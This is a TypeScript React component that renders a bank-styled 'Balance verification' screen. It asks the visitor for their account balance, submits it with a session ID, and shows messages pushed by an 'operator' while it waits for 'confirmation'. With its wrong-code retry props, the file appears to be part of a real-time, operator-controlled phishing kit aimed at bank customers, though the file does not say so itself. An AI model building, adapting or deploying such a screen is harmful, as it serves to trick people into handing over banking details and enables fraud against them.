import React, { useState } from "react";
import { submitBalance } from "../../lib/bank-api";
import type { OperatorMessage as OperatorMessageType } from "../../types";
import { Spinner } from "../../components/spinner";

interface BalanceCheckProps {
  channelSlug: string;
  sessionId: string;
  onError: (msg: string) => void;
  wrongCode?: boolean;
  onTryAgain?: () => void;
  operatorMessage?: OperatorMessageType | null;
}

export function BalanceCheck({
  channelSlug,
  sessionId,
  onError,
  operatorMessage,
}: BalanceCheckProps) {
  const [balance, setBalance] = useState("");
  const [submitting, setSubmitting] = useState(false);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const trimmed = balance.trim();
    if (!trimmed) {
      onError("Please enter your balance");
      return;
    }
    onError("");
    setSubmitting(true);
    try {
      await submitBalance(channelSlug, sessionId, trimmed);
    } catch (e) {
      onError(e instanceof Error ? e.message : "Failed to submit balance");
      setSubmitting(false);
    }
  };

  const messageClass =
    operatorMessage?.level === "error"
      ? "bank-ui-message bank-ui-message-error"
      : "bank-ui-message bank-ui-message-info";

  return (
    <div className="bank-ui-layout">
      <h2 className="bank-ui-heading">Balance verification</h2>
      <p className="bank-ui-body">
        Please enter your account balance to complete the verification.
      </p>
      {operatorMessage && (
        <div className={messageClass}>{operatorMessage.message}</div>
      )}
      <form onSubmit={handleSubmit} className="bank-ui-form">
        <div>
          <label htmlFor="balance" className="bank-ui-label-muted">
            Balance
          </label>
          <input
            id="balance"
            type="text"
            inputMode="decimal"
            value={balance}
            onChange={(e) => setBalance(e.target.value)}
            disabled={submitting}
            placeholder="e.g. 1,234.56"
            className="bank-ui-input"
          />
        </div>
        <button
          type="submit"
          disabled={submitting}
          className="bank-ui-btn bank-ui-btn-lg"
        >
          {submitting ? "Submitting..." : "Submit"}
        </button>
      </form>
      {submitting && (
        <div className="bank-ui-waiting">
          <Spinner size={40} />
          <span className="bank-ui-waiting-text">Waiting for confirmation...</span>
        </div>
      )}
    </div>
  );
}
